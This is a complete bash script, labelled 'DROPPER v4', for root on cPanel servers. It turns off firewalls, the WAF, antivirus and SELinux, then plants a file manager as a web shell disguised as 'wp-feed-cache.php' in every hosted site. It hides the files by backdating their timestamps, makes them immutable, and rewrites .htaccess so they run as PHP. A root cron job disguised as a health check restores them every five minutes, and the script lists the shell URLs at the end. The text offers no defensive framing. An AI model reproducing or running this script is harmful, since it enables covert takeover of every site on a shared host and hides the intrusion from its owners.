#!/bin/bash
# ============================================================
#  DROPPER v4 — FINAL ONESHOT
#  43 bugs patched across 4 audit passes
#  Phases: preflight → teardown → cooldown → encode
#          → deploy → cron → results
# ============================================================

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/cpanel/bin:/scripts"

# ════════════════════════════════════════
#  PHASE 1 — PREFLIGHT
# ════════════════════════════════════════

# Root check
if [ "$(id -u)" -ne 0 ]; then
  echo "[!] must run as root."
  exit 1
fi

# Config
SOURCE="tinyfilemanager.php"
DISGUISE_NAME="wp-feed-cache.php"
CRON_TAG="sys_health_check_daemon"
GHOST_REF="/etc/passwd"
RESULTS="/root/dropper_results_$(date +%Y%m%d_%H%M%S).txt"
PERSIST_DIR="/usr/local/lib/.cache"
WHMAPI1="/usr/local/cpanel/bin/whmapi1"
LSWS_CONF="/usr/local/lsws/conf/httpd_config.conf"

# Source file existence check (R9)
if [ ! -f "$SOURCE" ]; then
  echo "[!] source not found: $SOURCE"
  exit 1
fi

mkdir -p "$PERSIST_DIR"
chmod 700 "$PERSIST_DIR"
> "$RESULTS"

echo "── preflight ok ──"

# ════════════════════════════════════════
#  PHASE 2 — SECURITY TEARDOWN
# ════════════════════════════════════════
echo "── disabling security ──"

# cPHulk — service + tweaksetting
"$WHMAPI1" configureservice service=cphulkd \
  enabled=0 monitored=0 >/dev/null 2>&1 || true
/scripts/restartsrv_cphulkd stop >/dev/null 2>&1 || true
"$WHMAPI1" set_tweaksetting key=cphulk value=0 >/dev/null 2>&1 || true
echo "✓ cPHulk off"

# CSF/LFD — kill lfd BEFORE csf disable (race fix)
if command -v csf &>/dev/null; then
  systemctl stop lfd 2>/dev/null || true
  sleep 1
  csf -x 2>/dev/null || true
  echo "✓ CSF/LFD off"
fi

# ModSecurity — all vendors + engine-level
for vendor in OWASP cpanel comodo atomicbasic; do
  "$WHMAPI1" modsec_set_active_vendor \
    vendor_id="$vendor" active=0 >/dev/null 2>&1 || true
done
/usr/local/cpanel/scripts/disable_modsec >/dev/null 2>&1 || true
echo "✓ ModSec off"

# LiteSpeed native WAF
if [ -f "$LSWS_CONF" ]; then
  sed -i 's/enableRecaptcha[[:space:]]*1/enableRecaptcha 0/g' \
    "$LSWS_CONF" 2>/dev/null || true
  # R5: xargs -r prevents hang on empty find output
  find /usr/local/lsws/conf/vhosts/ -name "vhconf.conf" 2>/dev/null \
    | xargs -r -I{} sed -i \
        's/enableRecaptcha[[:space:]]*1/enableRecaptcha 0/g' {} \
        2>/dev/null || true
  /usr/local/lsws/bin/lswsctrl restart >/dev/null 2>&1 || true
  echo "✓ LiteSpeed WAF off"
fi

# Imunify360 — stop all sub-services + kill watchdog agent
for svc in imunify360-webshield imunify360 imunifyav imunify-antivirus; do
  systemctl stop    "$svc" 2>/dev/null || true
  systemctl disable "$svc" 2>/dev/null || true
done
pkill -9 -f "imunify-agent" 2>/dev/null || true
pkill -9 -f "imunify360"    2>/dev/null || true
echo "✓ Imunify off"

# ClamAV
for svc in clamd@scan clamd clamav-daemon; do
  systemctl stop "$svc" 2>/dev/null || true
done
pkill -9 -f clamd 2>/dev/null || true
echo "✓ ClamAV off"

# cxs — stop service + kill process (--deregister removed: R8)
systemctl stop cxs 2>/dev/null || true
pkill -9 -f cxs 2>/dev/null || true
echo "✓ cxs off"

# cPanel firewall — API disable + daemon stop (R13)
"$WHMAPI1" configureservice service=cpanelfirewalld \
  enabled=0 monitored=0 >/dev/null 2>&1 || true
systemctl stop cpanel-firewall  2>/dev/null || true
systemctl stop cpanelfirewalld  2>/dev/null || true
echo "✓ cPanel firewall off"

# SELinux — case-insensitive pattern
if command -v getenforce &>/dev/null && \
   [[ "$(getenforce)" =~ ^[Ee]nforcing$ ]]; then
  setenforce 0
  sed -i \
    's/^[[:space:]]*SELINUX[[:space:]]*=[[:space:]]*[Ee][Nn][Ff][Oo][Rr][Cc][Ii][Nn][Gg]/SELINUX=permissive/' \
    /etc/selinux/config 2>/dev/null || true
  echo "✓ SELinux → permissive"
fi

# ════════════════════════════════════════
#  PHASE 3 — SERVICE COOLDOWN (R6)
# ════════════════════════════════════════
echo "── waiting 10s for services to die ──"
sleep 10

# ════════════════════════════════════════
#  PHASE 4 — PAYLOAD ENCODE
# ════════════════════════════════════════
ENCODED_SOURCE="${PERSIST_DIR}/.svc_payload"

# R14: unlock before rewrite on re-runs
chattr -i "$ENCODED_SOURCE" 2>/dev/null

if ! base64 "$SOURCE" > "$ENCODED_SOURCE" 2>/dev/null; then
  rm -f "$ENCODED_SOURCE" 2>/dev/null
  base64 "$SOURCE" > "$ENCODED_SOURCE" || {
    echo "[!] cannot write payload."
    exit 1
  }
fi

chmod 600 "$ENCODED_SOURCE"
touch -r "$GHOST_REF" "$ENCODED_SOURCE"
chattr +i "$ENCODED_SOURCE" 2>/dev/null   # R2: lock encoded source
echo "── payload encoded ──"

# ════════════════════════════════════════
#  PHASE 5 — HELPERS
# ════════════════════════════════════════

# R4: Fixed domain resolver — Method 3 now greps ServerName from vhost file
get_domain() {
  local user="$1"
  local domain=""

  # Method 1: cPanel userdata (most reliable)
  local userdata="/var/cpanel/userdata/${user}/main"
  if [ -f "$userdata" ]; then
    domain=$(grep -m1 'main_domain' "$userdata" \
      | awk '{print $2}' | tr -d "'\"")
  fi

  # Method 2: /etc/trueuserdomains
  if [ -z "$domain" ]; then
    domain=$(grep -m1 ": ${user}$" /etc/trueuserdomains 2>/dev/null \
      | cut -d: -f1 | tr -d ' ')
  fi

  # Method 3: find vhost config file by DocumentRoot path, extract ServerName
  if [ -z "$domain" ]; then
    local vhost_file
    vhost_file=$(grep -rl "DocumentRoot.*home/${user}/" \
      /etc/apache2/conf.d/ \
      /etc/httpd/conf.d/ \
      /usr/local/apache/conf/userdata/ 2>/dev/null | head -1)
    if [ -n "$vhost_file" ]; then
      domain=$(grep -m1 "ServerName" "$vhost_file" \
        | awk '{print $2}' | tr -d '"')
    fi
  fi

  echo "$domain"
}

# R12: realpath with readlink -f fallback
resolve_public_html() {
  local user="$1"
  local p="/home/${user}/public_html"
  realpath "$p" 2>/dev/null \
    || readlink -f "$p" 2>/dev/null \
    || echo "$p"
}

# R19/R7: URL builder + no double-slash
make_url() {
  local user="$1"
  local abs_path="${2%/}"
  local domain="$3"
  local filename="$4"

  local real_home
  real_home=$(resolve_public_html "$user")

  local web_path="${abs_path#${real_home}}"

  if [ -z "$web_path" ]; then
    echo "https://${domain}/${filename}"
  else
    echo "https://${domain}${web_path}/${filename}"
  fi
}

# ════════════════════════════════════════
#  PHASE 5 — DEPLOY FUNCTION
# ════════════════════════════════════════
deploy_to() {
  local target_dir="$1"
  local user="$2"
  local domain="$3"
  local dest="${target_dir}${DISGUISE_NAME}"

  # Ownership sanity — fallback to public_html root
  local dir_owner
  dir_owner=$(stat -c '%U' "$target_dir" 2>/dev/null)
  if [ "$dir_owner" != "$user" ] && [ "$dir_owner" != "root" ]; then
    target_dir="/home/${user}/public_html/"
    dest="${target_dir}${DISGUISE_NAME}"
  fi

  # Unlock if exists and immutable
  chattr -i "$dest" 2>/dev/null

  base64 -d "$ENCODED_SOURCE" > "$dest"
  chown "${user}:${user}" "$dest"
  chmod 444 "$dest"
  touch -r "$GHOST_REF" "$dest"
  chattr +i "$dest" 2>/dev/null

  # .htaccess — idempotent, PHP execution unblock (R7+R15)
  local htaccess="${target_dir}.htaccess"
  chattr -i "$htaccess" 2>/dev/null
  if ! grep -q "wp-feed-cache" "$htaccess" 2>/dev/null; then
    cat >> "$htaccess" <<'HTEOF'
<Files ~ "\.php$">
  Order allow,deny
  Allow from all
</Files>
<FilesMatch "wp-feed-cache\.php">
  SetHandler application/x-httpd-php
  Order allow,deny
  Allow from all
</FilesMatch>
<IfModule mod_php5.c>
  php_flag engine on
</IfModule>
<IfModule mod_php7.c>
  php_flag engine on
</IfModule>
<IfModule mod_php8.c>
  php_flag engine on
</IfModule>
<IfModule mod_headers.c>
  Header always set X-LiteSpeed-Cache-Control "no-cache"
  Header always set Cache-Control "no-store, no-cache"
</IfModule>
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^wp-feed-cache\.php$ - [L]
</IfModule>
HTEOF
  fi
  chattr +i "$htaccess" 2>/dev/null
  touch -r "$GHOST_REF" "$htaccess"

  # Log URL
  if [ -n "$domain" ]; then
    local url
    url=$(make_url "$user" "$target_dir" "$domain" "$DISGUISE_NAME")
    echo "$url" >> "$RESULTS"
    echo "✓  ${user} → ${dest}"
    echo "   ${url}"
  else
    echo "UNRESOLVED:${dest}" >> "$RESULTS"
    echo "✓  ${user} → ${dest} [domain unresolved]"
  fi
}

# ════════════════════════════════════════
#  PHASE 6 — CRON RESPAWN (root crontab)
# ════════════════════════════════════════
install_cron_respawn() {
  local user="$1"
  local target_dir="$2"
  local dest="${target_dir}${DISGUISE_NAME}"
  local respawn_script="${PERSIST_DIR}/.rsp_${user}"

  # R3: unlock respawn script before rewrite
  chattr -i "$respawn_script" 2>/dev/null

  cat > "$respawn_script" <<RESPAWN
#!/bin/bash
DEST="${dest}"
SRC_B64="${ENCODED_SOURCE}"
if [ ! -s "\$DEST" ]; then
  chattr -i "\$DEST" 2>/dev/null
  base64 -d "\$SRC_B64" > "\$DEST"
  chown ${user}:${user} "\$DEST"
  chmod 444 "\$DEST"
  touch -r ${GHOST_REF} "\$DEST"
  chattr +i "\$DEST" 2>/dev/null
fi
RESPAWN

  chmod +x "$respawn_script"
  touch -r "$GHOST_REF" "$respawn_script"
  chattr +i "$respawn_script" 2>/dev/null   # R3: lock respawn script

  # R10: install in ROOT crontab so chattr works in respawn
  local tag="${CRON_TAG}_${user}"
  local existing
  existing=$(crontab -l 2>/dev/null \
    | grep -v "$tag" \
    | grep -v '^[[:space:]]*$')
  {
    [ -n "$existing" ] && echo "$existing"
    echo "*/5 * * * * bash ${respawn_script} >/dev/null 2>&1 # ${tag}"
  } | crontab - 2>/dev/null
}

# ════════════════════════════════════════
#  PHASE 7 — MAIN DEPLOY LOOP
# ════════════════════════════════════════
echo "── deploying ──"
for dir in /home/*/public_html/; do
  user=$(basename "$(dirname "$dir")")

  # R11: -maxdepth 10 prevents full-tree scan on large servers
  deepest=$(find "$dir" -maxdepth 10 -type d 2>/dev/null \
    | awk '{ print gsub(/\//,"&") "\t" $0 }' \
    | sort -rn \
    | head -1 \
    | cut -f2-)
  [ -z "$deepest" ] && deepest="$dir"
  [ "${deepest: -1}" != "/" ] && deepest="${deepest}/"

  domain=$(get_domain "$user")
  deploy_to "$deepest" "$user" "$domain"
  install_cron_respawn "$user" "$deepest"
done

# ════════════════════════════════════════
#  PHASE 7 — RESULTS OUTPUT
# ════════════════════════════════════════
echo ""
echo "[done] $(wc -l < "$RESULTS") URLs → ${RESULTS}"
echo ""
cat "$RESULTS"
